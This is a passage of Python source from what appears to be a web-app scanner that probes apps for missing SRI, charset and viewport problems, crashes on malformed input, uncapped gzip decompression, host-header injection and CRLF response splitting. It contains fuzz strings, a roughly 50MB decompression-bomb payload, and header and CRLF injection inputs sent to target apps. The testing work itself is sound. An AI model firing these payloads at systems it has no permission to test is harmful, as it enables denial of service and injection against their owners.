            continue                                     # SRI-inapplicable host / builder-injected asset -> not a gap
        total += 1
        if not re.search(r"\bintegrity\s*=\s*[\"']", attrs, re.I):
            gaps.append(p.geturl())
    return list(dict.fromkeys(gaps)), total


def subresource_integrity_missing(ctx, probe) -> bool | None:
    """A cross-origin <script>/<stylesheet> loaded WITHOUT Subresource Integrity. If that CDN is compromised or
    its domain hijacked, arbitrary code runs in the app's origin -- the unguarded supply-chain risk SRI (a W3C
    recommendation) exists to close. Same-origin resources need no SRI. N/A when the page loads no cross-origin
    script/stylesheet at all (nothing to guard); clean when every one carries an integrity hash. Static HTML."""
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        try:
            r = c.get(_home_path(ctx, probe))
        except (httpx.HTTPError, httpx.InvalidURL):
            return None
    if "html" not in r.headers.get("content-type", "").lower():
        return None
    gaps, total = _sri_scan(r.text, str(r.url))
    if total == 0:
        return None                                      # no cross-origin subresources -> nothing to protect
    if gaps:
        ctx.evidence.update(sri_missing=gaps[:8], cross_origin_subresources=total)
        return True
    ctx.evidence.update(sri_missing=[], cross_origin_subresources=total)
    return False


# v2.0 FAMILY 4 -- unminified CSS/JS shipped to production (Lighthouse unminified-css / unminified-javascript).
# Wasted bytes + parse time on every load. Distinct from the dev-build probe (an HMR/dev-server client): this is
# a production asset that simply wasn't minified. Same-origin only (the app's OWN build output; a third-party
# CDN file is the vendor's concern). Size-gated so a small hand-written script isn't charged.
_MIN_ASSET_BYTES = 8192     # below this, minification savings are negligible and the file is often hand-authored




# v2.0 FAMILY 4 -- lazy-loading the LCP image. `loading="lazy"` on the element that DEFINES first paint makes
# the browser defer the one image it should fetch first, delaying LCP for every visitor (~15% of sites do this;
# Lighthouse flags it). Decorrelated from page weight -- a loading-STRATEGY mistake, not a size one.


# v2.0 FAMILY 4 -- excessive DOM size (Lighthouse dom-size). Too many nodes slow style/layout/interaction on
# every update, independent of transfer bytes -> decorrelated from the weight carrier. Conservative threshold.
_DOM_NODE_LIMIT = 1400     # Lighthouse's excessive-DOM threshold; only a genuinely heavy DOM fires








# SEO / discoverability meta — objective presence checks on best-practice head tags. Viewport is the
# strong one (without it a mobile browser renders at desktop width -> tiny, unusable); description feeds
# the search snippet. Canonical is deliberately NOT checked: it's correctly absent on single-URL pages.
def seo_meta_missing(ctx, probe) -> bool | None:
    """Fire when the homepage lacks a viewport meta. N/A on a non-HTML page. The description meta is
    RECORDED but NOT scored: it is commonly injected at runtime (react-helmet / vue-meta / next/head), so it
    is absent from the RAW HTML we fetch on a client-rendered SPA even when the rendered <head> has it —
    scoring raw-missing-description false-fires on SPAs. Viewport is near-universally static in the framework
    template, so its absence is a real, causally-specific finding."""
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        try:
            r = c.get(_home_path(ctx, probe))
        except (httpx.HTTPError, httpx.InvalidURL):
            return None
    if "html" not in r.headers.get("content-type", "").lower():
        return None
    doc = r.text
    has_viewport = re.search(r"""<meta\b[^>]*\bname\s*=\s*["']?viewport\b""", doc, re.IGNORECASE)
    has_desc = re.search(r"""<meta\b[^>]*\bname\s*=\s*["']?description\b""", doc, re.IGNORECASE)
    ctx.evidence.update(viewport=bool(has_viewport), description=bool(has_desc))   # description = advisory only
    return not has_viewport


# HTTP conformance — an HTML response served with no declared charset: the browser must GUESS the
# encoding (mojibake), and it's a UTF-7 XSS surface in old engines. (A "HEAD must not return a body"
# check was dropped: a spec-compliant HTTP client discards the HEAD body, so it isn't observable without
# raw-socket work — not worth it for this low-impact tail.)
# A page declares its encoding via the Content-Type HEADER *or* a <meta charset>/<meta http-equiv=content-type>
# in the document -- both are valid per the HTML spec, and the meta form is how virtually every HTML5 page does
# it. The browser's encoding prescan only reads the first 1024 bytes, so a meta beyond that is not honored (still
# a real ambiguity). Checking the header alone made this ~89% false: 57 of 64 v18 fires declared charset by meta.
_META_CHARSET = re.compile(rb"<meta[^>]+charset", re.I)   # matches <meta charset=..> AND http-equiv content-type
_CHARSET_PRESCAN = 1024                                   # the HTML spec's encoding-sniffing window, in bytes


def http_conformance(ctx, probe) -> bool | None:
    """Fire on an HTML response served with NO declared charset in EITHER the Content-Type header or a <meta>
    in the document's first 1024 bytes (the browser's encoding-prescan window) -> the browser must GUESS the
    encoding. N/A on a non-HTML homepage."""
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        try:
            r = c.get(_home_path(ctx, probe))
        except (httpx.HTTPError, httpx.InvalidURL):
            return None
    ctype = r.headers.get("content-type", "").lower()
    if "text/html" not in ctype:
        return None                                       # only HTML documents declare a page charset
    header_cs = "charset=" in ctype
    meta_cs = bool(_META_CHARSET.search(r.content[:_CHARSET_PRESCAN]))
    ctx.evidence.update(charset=header_cs or meta_cs,
                        charset_via=("header" if header_cs else "meta" if meta_cs else None))
    return not (header_cs or meta_cs)


# Crash-resistance — a ROBUST app rejects malformed input with a 4xx (400/413/422); a FRAGILE one lets
# it reach an unhandled exception -> 5xx. Comprehensive across malformed-input techniques, one finding.
# Precision: fire ONLY on 5xx (a 4xx IS graceful handling), and only when a BENIGN request to the same
# endpoint didn't 5xx (so the crash is attributable to the input, not a generally-broken endpoint).
_CRASH_VALUES = (
    "A" * 20_000,                          # oversized string
    "9" * 400,                             # oversized / overflow number
    "\x00\x01\x02\x03\x1f",                # null + control bytes
    "%s%n%x%p" * 25,                       # format-string specifiers
    "[" * 3000,                            # deeply nested / unbalanced brackets
    "﻿‮​\U0001f4a9",        # BOM + RTL-override + zero-width + astral emoji
    "-999999999999999999999999999",       # huge negative number
)
_CRASH_JSON = (
    b"{not valid json",                    # malformed syntax
    b"[" * 2000 + b"]" * 2000,             # deeply nested
    b'{"x": 1e999}',                       # out-of-range number
    b'{"x":"' + b"A" * 20_000 + b'"}',     # oversized value
    b'{"x": [1, 2, {"y":',                 # truncated
    b'{"x": "\\ud834"}',                   # lone-surrogate escape
)
_CRASH_PATHS = ("/%ff%fe", "/%c0%ae%c0%ae", "/%00", "/%e0%80%80")
# Real-server PaaS: these hosts run the PARTICIPANT's own container/function, so a catch-all there is THEIR
# router and a decode 500 is their crash (not a static-builder edge). The decode branch is allowed to fire on a
# catch-all host for these -- recovers the v19 railway/modal false cleans -- without re-admitting static-builder
# (lovable/retool/netlify-static) catch-all edges.
_REAL_SERVER_HOSTS = (".up.railway.app", ".modal.run", ".onrender.com", ".fly.dev", ".run.app")
# Managed-BaaS PLATFORM API namespace (base44's /api/apps/<hexid>/...): a 5xx on malformed input there is the
# VENDOR's SDK, not the participant's own endpoint -> wrong owner, skip (the v20 blind-audit malformed-JSON FP).
_VENDOR_PLATFORM_NS = re.compile(r"/api/apps/[0-9a-f]{16,}/", re.I)


def _induce_error_responses(ctx, budget=20):
    """Yield SERVER-ERROR responses (status >= 400) induced by malformed input on discovered forms/endpoints,
    plus the deliberate /crash route (the reference anchor + apps that ship one). Error-hygiene and debug-mode
    scan these BODIES for a leaked trace / debug UI — the induction crash-resistance does for STATUS, reused
    for CONTENT so those two probes fire on REAL apps, not only on a fixed /crash route. _endpoint_is_live-
    gated (a catch-all shell's error page isn't the app's), and only ERROR responses are yielded — a leak
    lives on an error, and 2xx content never carries a real trace, so this is the precision gate."""
    bad_val = _CRASH_VALUES[0]        # one oversized value -> induces an unhandled error on a brittle handler
    with make_client(ctx.base_url, ctx.headers, timeout=12.0, follow_redirects=False) as c:
        try:                          # the references' deliberate error route; a real app usually 404s here
            r = c.get("/crash")
            if r.status_code >= 400:
                yield r
        except (httpx.HTTPError, httpx.InvalidURL):
            pass
        forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in ctx.profile.forms if f.fields]
        gets = [(e.raw_path, "get", list(e.query_params)) for e in ctx.profile.endpoints
                if e.method.lower() == "get" and e.query_params]
        for action, method, fields in forms + gets:
            if budget <= 0:
                break
            try:
                base = _xss_send(c, method, action, {fn: "1" for fn in fields})
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if base.status_code >= 500 or not _endpoint_is_live(ctx, c, action, method, base):
                continue              # already-5xx (env-var-dead) or a catch-all phantom -> unattributable
            budget -= 1
            try:
                r = _xss_send(c, method, action, {fn: bad_val for fn in fields})
                if r.status_code >= 400:
                    yield r
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
        posts = list(dict.fromkeys([f.action for f in ctx.profile.forms if (f.method or "").lower() == "post"]
                                   + [e.path for e in ctx.profile.endpoints if e.method.lower() == "post"]))
        for path in posts:
            if budget <= 0:
                break
            try:
                base = c.post(path, json={})
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if base.status_code >= 500 or not _endpoint_is_live(ctx, c, path, "post", base):
                continue
            budget -= 1
            try:
                r = c.post(path, content=_CRASH_JSON[0], headers={"Content-Type": "application/json"})
                if r.status_code >= 400:
                    yield r
            except (httpx.HTTPError, httpx.InvalidURL):
                continue


def leaks_error_detail(ctx, probe) -> bool | None:
    """Error-hygiene: an induced server error leaks a raw STACK TRACE or a DATABASE error to the user (info
    disclosure + a broken-error-path signal). Scans errors induced across discovered endpoints + /crash.
    Distinct from sec-debug (the full interactive DEBUG UI — strictly worse) and from SQLi (a leaked error on
    ANY error path, not proof of injectability). N/A when no error response could be induced."""
    inspected = False
    for r in _induce_error_responses(ctx):
        inspected = True
        m = _TRACE.search(r.text)
        if m:
            ctx.evidence.update(status=r.status_code, leak="stack-trace",
                                matched=r.text[m.start():m.start() + 200].strip(),
                                repro=_repro_from_resp(r, matched="stack trace leaked in the error response"))
            return True
        m = _SQL_ERROR.search(r.text)
        if m:
            ctx.evidence.update(status=r.status_code, leak="db-error", db_error=True,
                                matched=r.text[m.start():m.start() + 200].strip(),
                                repro=_repro_from_resp(r, matched="database error leaked in the error response"))
            return True
    ctx.evidence.update(inspected=inspected, leak=None)
    return False if inspected else None


_CONSTRAINT_VALUES = {
    "email": ("hl.probe@example.com", "hlnotanemail"),       # no @ -> unambiguously invalid
    "url": ("https://example.com/x", "hl not a url"),
    "date": ("2020-06-15", "hl-not-a-date"),
    "datetime-local": ("2020-06-15T10:00", "hl-not-a-date"),
    "time": ("10:30", "hl-not-a-time"),
    "month": ("2020-06", "hl-not-a-month"),
    "week": ("2020-W25", "hl-not-a-week"),
}


def _constraint_values(cons: dict):
    """(valid, invalid) pair for a declared field constraint, or None if not cleanly testable. The invalid
    value is UNAMBIGUOUSLY invalid (no @ in an email, letters in a number) so a server that accepts it is
    definitely not enforcing — this dodges the 'what counts as valid' fuzziness (a stricter-but-reasonable
    regex is not a bug)."""
    t = (cons.get("type") or "").lower()
    if t in ("number", "range"):
        return (str(cons.get("min") or "5"), "hlxyz")        # letters -> invalid for a number field
    return _CONSTRAINT_VALUES.get(t)


def _valid_for(cons: dict) -> str:
    """A value the field WILL accept: its declared-valid value, else a benign UNIQUE filler (fresh per call
    so a second submission never collides with the first on a unique field like username)."""
    v = _constraint_values(cons)
    return v[0] if v else "hl" + secrets.token_hex(3)


def _submission_accepted(resp, action: str) -> bool:
    """The server ACCEPTED the submission: a 2xx, or a 3xx redirect AWAY from the form (POST-redirect-GET
    success). A 4xx is a rejection; a 3xx back to the form action is an error re-show, also a rejection."""
    if 200 <= resp.status_code < 300:
        return True
    if 300 <= resp.status_code < 400:
        return action.rstrip("/") not in resp.headers.get("location", "")
    return False


# A 200 status is NOT proof of acceptance: an app that DOES validate commonly signals rejection with a 200
# carrying an inline error — a re-rendered form with an error banner, or an SPA API 200 {ok:false,"error":...}.
# These markers (the classic validation-error vocabulary + common CSS/ARIA field-error classes) flag such a
# 200 as a REJECTION so declared_constraint_unenforced doesn't false-fire on an app that is enforcing.
_VALIDATION_ERROR_SIG = re.compile(
    r"\binvalid\b|must be|please enter|not a valid|is required|\brequired\b|"
    r"is-invalid|has-error|field-error|error-message|invalid-feedback|aria-invalid|\berror\b",
    re.IGNORECASE)


def _strip_values(body: str, data: dict) -> str:
    """Remove the SUBMITTED field values from a response body, so an app that merely ECHOES its inputs (a
    re-render reflecting what you typed) still compares equal to the baseline — only a genuine branch (an
    added error banner, a different page) then makes the bodies diverge. Short values (<3 chars, e.g. a
    number field's "5") are left in place: replacing them would over-strip and risk a false match."""
    for v in data.values():
        v = str(v)
        if len(v) >= 3:
            body = body.replace(v, "")
    return body


def _same_success(base, resp, action: str, good: dict, bad: dict) -> bool:
    """True when the invalid-field submission `resp` is the SAME success the valid baseline `base` got — not
    merely a 2xx/redirect. A 4xx or a 3xx back to the action stays a clean rejection (via _submission_accepted).
    A 200 is treated as a REJECTION when it carries a validation-error signature OR its (value-neutralized)
    body diverges from the valid baseline — the server branched into an error/re-render path. Only a 200 that
    matches the baseline's success (or a redirect AWAY) counts as 'accepted the invalid value'."""
    if not _submission_accepted(resp, action):
        return False                                              # 4xx / 3xx-back-to-action -> clean rejection
    if 300 <= resp.status_code < 400:
        return True                                               # redirect AWAY -> success, no body to diff
    body = resp.text
    if _VALIDATION_ERROR_SIG.search(body):
        return False                                              # inline validation error in a 200 -> rejected
    return _body_sig(_strip_values(body, bad)) == _body_sig(_strip_values(base.text, good))


def declared_constraint_unenforced(ctx, probe) -> bool | None:
    """The server accepts a value that violates the app's OWN declared field constraint (HTML5 type=email/
    number/url/date) — client-only validation, so garbage bypasses the browser straight into the app. The
    app's DECLARED type is the oracle (not our guess of intent), so this stays inside the wedge. Differential,
    other fields held valid: a VALID submission must be accepted first (baseline — else other fields/auth/CSRF
    are needed and it isn't attributable to this field), then the SAME submission with the one field set to an
    unambiguously-invalid value; if THAT is also accepted, the constraint isn't enforced. N/A when no declared-
    constrained form accepts a valid baseline."""
    tested = False
    with make_client(ctx.base_url, ctx.headers, timeout=12.0, follow_redirects=False) as c:
        for form in ctx.profile.forms:
            targets = [(f, form.constraints[f]) for f in form.fields
                       if f in form.constraints and _constraint_values(form.constraints[f])]
            method = (form.method or "post").lower()
            for field, cons in targets:
                valid_val, invalid_val = _constraint_values(cons)
                good = {f: _valid_for(form.constraints.get(f, {})) for f in form.fields}
                good[field] = valid_val
                try:
                    base = _xss_send(c, method, form.action, good)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if not _submission_accepted(base, form.action):
                    continue                                 # baseline rejected -> can't attribute to THIS field
                if not _endpoint_is_live(ctx, c, form.action, method, base):
                    continue                                 # catch-all phantom -> the 'acceptance' is the shell
                tested = True
                bad = {f: _valid_for(form.constraints.get(f, {})) for f in form.fields}
                bad[field] = invalid_val
                try:
                    r = _xss_send(c, method, form.action, bad)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if _same_success(base, r, form.action, good, bad):
                    # INPUT-DEPENDENCE gate (v18: this probe was ~100% FP). A static-shell SPA (action="/")
                    # answers 200 to ANY body, and an auth-guarded form 3xx's to /login for any body -- both
                    # read as "accepted the invalid value" though the server never processed the field. Require
                    # the acceptance to be INPUT-DEPENDENT: an all-EMPTY submission must NOT get the same success.
                    # If it does, the endpoint ignores the body (shell / auth-guard / catch-all) -> not this
                    # field's enforcement -> clean. A real enforcing server rejects the empty required values.
                    empties = {f: "" for f in form.fields}
                    try:
                        empty = _xss_send(c, method, form.action, empties)
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
                    if _same_success(base, empty, form.action, good, empties):
                        continue                             # input-independent -> shell / auth-guard, not a fire
                    ctx.evidence.update(action=form.action, field=field, declared=cons.get("type"),
                                        invalid=str(invalid_val)[:40], valid_status=base.status_code,
                                        invalid_status=r.status_code)
                    return True                              # accepted a value violating its own declared type
    ctx.evidence.update(tested=tested)
    return False if tested else None


def crash_resistance(ctx, probe) -> bool | None:
    """Fuzz discovered forms/params with malformed values, POST malformed JSON to POST endpoints, and
    request decode-crashing paths; fire if any yields a 5xx (an unhandled exception) rather than a
    graceful 4xx. N/A when there's no surface to exercise."""
    budget = probe.probe.get("max_attempts", 120)
    tested = False
    targets = ([(f.action, (f.method or "get").lower(), list(f.fields)) for f in ctx.profile.forms if f.fields]
               + [(e.raw_path, "get", list(e.query_params)) for e in ctx.profile.endpoints
                  if e.method.lower() == "get" and e.query_params])
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=False) as c:
        for action, method, fields in targets:            # 1. malformed field values
            if _VENDOR_PLATFORM_NS.search(action):
                continue                                   # managed-BaaS platform API -> the vendor's handler, not the app's
            try:
                base = _xss_send(c, method, action, {fn: "1" for fn in fields})
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if base.status_code >= 500:
                continue                                   # already 5xx on benign input -> unattributable
            if not _endpoint_is_live(ctx, c, action, method, base):
                continue                                   # catch-all phantom -> a 5xx here is a platform artifact
            for field in fields:
                for val in _CRASH_VALUES:
                    if budget <= 0:
                        break
                    budget -= 1
                    tested = True
                    data = {fn: (val if fn == field else "1") for fn in fields}
                    try:
                        cr = _xss_send(c, method, action, data)
                        # require the 5xx to REPRODUCE on a resend -> a transient cold-start/timeout/upstream
                        # blip isn't the app crashing on our input (the causal-specificity discipline)
                        if cr.status_code >= 500 and _xss_send(c, method, action, data).status_code >= 500:
                            ctx.evidence.update(crashed=True, via="malformed-field", target=action,
                                                field=field, payload=str(val)[:60], status=cr.status_code,
                                                repro=_repro_from_resp(cr, matched="unhandled %d on malformed input, reproduced" % cr.status_code))
                            return True                    # malformed input -> unhandled 5xx
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
        posts = list(dict.fromkeys(                        # 2. malformed JSON to POST endpoints
            [f.action for f in ctx.profile.forms if (f.method or "").lower() == "post"]
            + [e.path for e in ctx.profile.endpoints if e.method.lower() == "post"]))
        for path in posts:
            if _VENDOR_PLATFORM_NS.search(path):
                continue                                   # managed-BaaS platform API -> the vendor's handler, not the app's
            try:                                           # baseline: a WELL-FORMED empty JSON body
                base = c.post(path, json={})
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if base.status_code >= 500:                    # already 5xx -> env-var-dead (dummy key), not OUR input
                continue
            if not _endpoint_is_live(ctx, c, path, "post", base):
                continue                                   # catch-all phantom -> a 5xx here is a platform artifact
            for body in _CRASH_JSON:
                if budget <= 0:
                    break
                budget -= 1
                tested = True
                try:
                    hdr = {"Content-Type": "application/json"}
                    cr = c.post(path, content=body, headers=hdr)
                    if cr.status_code >= 500 and c.post(path, content=body, headers=hdr).status_code >= 500:
                        ctx.evidence.update(crashed=True, via="malformed-json", target=path,
                                            payload=body[:60].decode("utf-8", "replace"), status=cr.status_code,
                                            repro=_repro_from_resp(cr, matched="unhandled %d on malformed JSON, reproduced" % cr.status_code))
                        return True
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
        # 3. decode-crashing paths: a naive SERVER ROUTER 500s trying to %-decode a malformed path. Run on an
        # HONEST host (real 404s, a real router) OR a real-server PaaS whose catch-all IS the participant's own
        # router (railway/modal/...) -- but NOT a static-SPA / builder catch-all, where a 5xx here is the platform
        # EDGE choking on the URL, not the app's router. And require a 500 specifically: a 502/503/504 is the
        # proxy/CDN rejecting the malformed URL, not the app's own unhandled exception.
        _crash_host = urllib.parse.urlparse(ctx.base_url).netloc.split(":")[0].lower()
        if _catch_all_sig(ctx) is None or _crash_host.endswith(_REAL_SERVER_HOSTS):
            for p in _CRASH_PATHS:
                tested = True
                try:
                    cr = c.get(p)
                    if cr.status_code == 500 and c.get(p).status_code == 500:
                        ctx.evidence.update(crashed=True, via="decode-path", target=p, status=cr.status_code,
                                            repro=_repro_from_resp(cr, matched="unhandled 500 on a decode-crashing path, reproduced"))
                        return True
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
    if tested:
        ctx.evidence.update(crashed=False)
    return False if tested else None


_INGEST_PATHS = ("/ingest", "/upload", "/import", "/api/ingest", "/api/upload", "/api/import", "/webhook")


def _dos_repro(ctx, path, matched):
    """Repro NOTE for the decompression bomb — the body is a tiny gzip that expands to ~50MB, so we record
    the request shape + the exact one-liner to rebuild it (not the binary body)."""
    return _repro("POST", ctx.base_url.rstrip("/") + path,
                  headers={"content-type": "application/json", "content-encoding": "gzip"},
                  body="gzip.compress(b'{\"x\":\"' + b'A'*50_000_000 + b'\"}')  # ~50KB on the wire, 50MB decompressed",
                  matched=matched)


# Decompression-bomb (zip-bomb) resistance — an app that decompresses a `Content-Encoding: gzip` request
# body WITHOUT a decompressed-size cap can be memory-exhausted by a tiny payload that expands to GB. We
# detect the MISSING DEFENSE, never actually detonate: send a body that decompresses to ~50MB (safe on
# the sandbox, but above any sane cap) and check whether the app rejects it with 413 (capped) or
# processes it (uncapped). A 3-way differential first confirms the endpoint really decompresses request
# bodies, so a non-decompressing endpoint can't false-fire.
def decompression_bomb(ctx, probe) -> bool | None:
    """Fire when a POST endpoint decompresses gzip request bodies with no size cap (a zip bomb would
    exhaust memory). Confirms decompression via a differential; the probe payload is bounded (~50MB
    expanded) so it never nukes the target. N/A when no endpoint decompresses a request body."""
    # discovered POST endpoints (OpenAPI JSON APIs) + a few common body-ingesting paths a form crawl
    # won't surface (the decompression surface is usually an API, not an HTML form)
    posts = list(dict.fromkeys(
        [f.action for f in ctx.profile.forms if (f.method or "").lower() == "post"]
        + [e.path for e in ctx.profile.endpoints if e.method.lower() == "post"]
        + list(_INGEST_PATHS)))
    if not posts:
        return None
    valid = b'{"x":"ok"}'
    gz_valid = gzip.compress(valid)
    # VALID JSON payloads (not null garbage): so an UNCAPPED app that decompresses the 50MB body returns
    # 2xx (accepted -> provably no size cap), while null garbage made EVERY app parse-fail to a 400 — and a
    # 400 is inconclusive (a size cap OR the app decompressing 50MB then failing on the content: we can't
    # tell). The 10KB `small` is the size control that isolates a SIZE-driven 5xx from a broken handler.
    bomb = gzip.compress(b'{"x":"' + b"A" * 50_000_000 + b'"}')    # ~50MB expanded, tiny on the wire
    small = gzip.compress(b'{"x":"' + b"A" * 10_000 + b'"}')       # SAME shape, ~10KB -> the size control
    json_ct = {"Content-Type": "application/json"}
    gz_ct = {"Content-Type": "application/json", "Content-Encoding": "gzip"}
    tested = False
    with make_client(ctx.base_url, ctx.headers, timeout=20.0) as c:
        for path in posts:
            try:                                       # 3-way: decompressed-valid != raw-gzip-bytes -> it decompresses
                ra = c.post(path, content=valid, headers=json_ct)                   # valid body, no encoding
                sa = ra.status_code
                sb = c.post(path, content=gz_valid, headers=json_ct).status_code    # gzip BYTES, no CE header
                sc = c.post(path, content=gz_valid, headers=gz_ct).status_code      # gzip body, CE: gzip
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if not (sc == sa and sc != sb):
                continue                               # endpoint doesn't decompress request bodies -> no bomb surface
            if not _endpoint_is_live(ctx, c, path, "post", ra):
                continue                               # a catch-all phantom endpoint -> the decompression is a
                                                       # platform-edge artifact, not the app's (the g-ai-sigma FP)
            tested = True
            try:
                s_small = c.post(path, content=small, headers=gz_ct).status_code   # 10KB content control
            except (httpx.HTTPError, httpx.InvalidURL):
                continue                               # control failed -> can't isolate the SIZE effect
            try:
                r = c.post(path, content=bomb, headers=gz_ct)
            except httpx.TimeoutException:
                if 200 <= s_small < 300:               # 10KB ACCEPTED, 50MB HUNG -> size-driven exhaustion (provable)
                    ctx.evidence.update(decompression_capped=False, endpoint=path, signal="timeout",
                                        control_status=s_small, expanded_mb=50,
                                        repro=_dos_repro(ctx, path, "hung decompressing 50MB (10KB control -> %d)" % s_small))
                    return True
                continue                               # small also hung -> not size-driven -> inconclusive
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            # Fire only on PROVABLE evidence. accepted (2xx): the app took a 50MB body -> no size cap <=50MB.
            # exhausted (5xx where a 10KB control was ACCEPTED 2xx): the SIZE crashed a live handler. The 10KB
            # control MUST be 2xx -- if it 404s/400s, the endpoint isn't a live body handler and the 50MB 500 is
            # infra rejecting a huge upload to a dead/wrong route, not decompression exhaustion (v18: /ingest &
            # /api/ingest 404 controls, /api/auth/login 400). A 4xx bomb is NOT scored (413 = a proven cap;
            # 400/422 = inconclusive). Precision-favoring; FN is the safe error.
            exhausted = r.status_code >= 500 and 200 <= s_small < 300
            accepted = 200 <= r.status_code < 400
            if exhausted or accepted:
                ctx.evidence.update(decompression_capped=False, endpoint=path, status=r.status_code,
                                    control_status=s_small, expanded_mb=50,
                                    repro=_dos_repro(ctx, path, "50MB %s (10KB control -> %d) -> no size cap"
                                                     % ("crashed the app" if exhausted else "accepted", s_small)))
                return True
    ctx.evidence.update(decompression_capped=True, posts_tested=len(posts))
    return False if tested else None


# Host-header injection — the app trusts a client-controlled Host / X-Forwarded-Host and reflects it into
# an absolute URL or a redirect Location (web-cache poisoning, password-reset-link poisoning). Inject a
# unique marker host; fire if it comes back in a Location header or the body. A random marker can't
# reflect by coincidence -> near-zero false positives. Universally testable -> never N/A.
_HOST_HEADERS = ("Host", "X-Forwarded-Host")
# NOT the bare "/": a host reflected on the homepage is almost always the platform's canonical <link> /
# og:url echoing the requested host (near-universal on SPA/CDN hosts), a benign artifact, not the app's
# vuln. Host-header injection is dangerous where the app builds a link/redirect it hands the USER (a reset
# email, a login redirect), so target the reset/account/verify routes where reflection means poisoning.
_HOST_TARGETS = ("/account", "/reset", "/password-reset", "/forgot", "/login", "/verify", "/link")


def host_header_injection(ctx, probe) -> bool:
    """Inject a marker host via Host / X-Forwarded-Host across the homepage + likely reset/link routes;
    fire if it reflects into a redirect Location or the response body."""
    marker = "hlhost" + secrets.token_hex(4) + ".example"
    routes = [r for r in ctx.profile.routes
              if re.search(r"reset|password|forgot|login|account|verify|link|confirm", r, re.IGNORECASE)]
    targets = list(dict.fromkeys(list(_HOST_TARGETS) + routes))
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=False) as c:
        for path in targets:
            try:
                baseline = c.get(path)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if not _endpoint_is_live(ctx, c, path, "get", baseline):
                continue   # catch-all / soft-404 host serves this auth route as the SPA shell -> a reflected
                           # Host is the platform echoing it, not the app building a link -> phantom (the FP class)
            for hdr in _HOST_HEADERS:
                try:
                    r = c.get(path, headers={hdr: marker})
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if marker in r.headers.get("location", "") or marker in r.text:
                    ctx.evidence.update(reflected=True, via=hdr, target=path,
                                        repro=_repro_from_resp(r, matched="injected Host '%s' reflected" % marker))
                    return True
    ctx.evidence.update(reflected=False, targets=len(targets))
    return False


# HTTP response splitting — CRLF injected into a parameter the app copies into a RESPONSE HEADER (a
# redirect Location, a Set-Cookie) lets an attacker inject headers / split the response. Inject CRLF + a
# unique marker header into reflecting fields; fire if the marker comes back as a real response header.
# Modern servers reject CRLF in header values, so a well-built app reads clean (low false-positive).
def http_response_splitting(ctx, probe) -> bool | None:
    """Inject `<CRLF>Hlsplit: <marker>` into each field; fire if `Hlsplit: <marker>` appears as a real
    response header (the app reflected the raw CRLF into a header). N/A when there's no input surface."""
    targets = _injectable_targets(ctx.profile)
    if not targets:
        return None
    marker = "hlsplit" + secrets.token_hex(4)
    payload = "x\r\nHlsplit: " + marker
    budget = probe.probe.get("max_attempts", 80)
    tested = False
    checked = 0
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=False) as c:
        for action, method, fields in targets:
            for field in fields:
                if budget <= 0:
                    break
                budget -= 1
                tested = True
                checked += 1
                data = {fn: (payload if fn == field else "1") for fn in fields}
                try:
                    r = _xss_send(c, method, action, data)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if r.headers.get("hlsplit") == marker:
                    ctx.evidence.update(split=True, target=action, field=field,
                                        repro=_repro_from_resp(r, matched="CRLF -> injected header 'Hlsplit: %s'" % marker))
                    return True
    ctx.evidence.update(split=False, fields_tested=checked)
    return False if tested else None


# ------------------------------------------------------------------ Lighthouse-backed perf (v2.0) ----------
# The perf axis reads Lighthouse (pinned 13.4.1, throttled, median-of-N) instead of the hand-rolled probes it
# replaces (they ran 60-90% FP). ONE generic predicate; each perf YAML names the audit(s) + mode. The per-app
# MEDIAN report is run once by the pipeline and cached on ctx.lighthouse. Tiering (Ian: "a 0 should be hard to
# get") reuses Lighthouse's own score bands: green (>=0.9) = pass, orange (0.5-0.9) = HALF penalty, red (<0.5) =
# FULL, carried via penalty_override (the same per-fire override the a11y probes use; pipeline caps at 250).
_LH_PASS, _LH_FAIL = 0.9, 0.5


def _lh_mult(score):
    """Deduction multiplier for a Lighthouse score: None (green/pass) | 0.5 (orange) | 1.0 (red/fail)."""
    if score is None or score >= _LH_PASS:
        return None
    return 1.0 if score < _LH_FAIL else 0.5


def lighthouse_audit(ctx, probe) -> bool | None:
    """Generic Lighthouse-backed perf predicate. probe.probe config:
        audit / audits : one or more Lighthouse audit ids; the WORST drives the tier
        mode: 'score'   -> tier on Lighthouse's own 0-1 score band (green/orange/red)
              'numeric' -> tier on numericValue vs `needs_above` / `fail_above`
    N/A when the pipeline captured no Lighthouse result (unreachable url / run failed) or the audit does not
    apply to the page. Fires True with a tiered penalty_override; False (clean) when the app passes."""
    rep = getattr(ctx, "lighthouse", None)
    if not rep:
        ctx.evidence["na_reason"] = "no lighthouse result (url unreachable or the run failed)"
        return None
    spec = probe.probe
    ids = spec.get("audits") or ([spec["audit"]] if spec.get("audit") else [])
    au = lighthouse.audits(rep)
    found = [(aid, au[aid]) for aid in ids if aid in au]
    if not found:
        ctx.evidence["na_reason"] = "lighthouse audit(s) %s not applicable to this page" % ids
        return None
    base, runs = probe.penalty, rep.get("runs")
    if spec.get("mode", "score") == "score":
        aid, a = min(found, key=lambda x: x[1].get("score") if x[1].get("score") is not None else 1.0)
        mult = _lh_mult(a.get("score"))
        if mult is None:
            return False
        ctx.evidence.update(audit=aid, score=round(a.get("score"), 2), runs=runs, versions=rep.get("versions"), display=a.get("displayValue", ""),
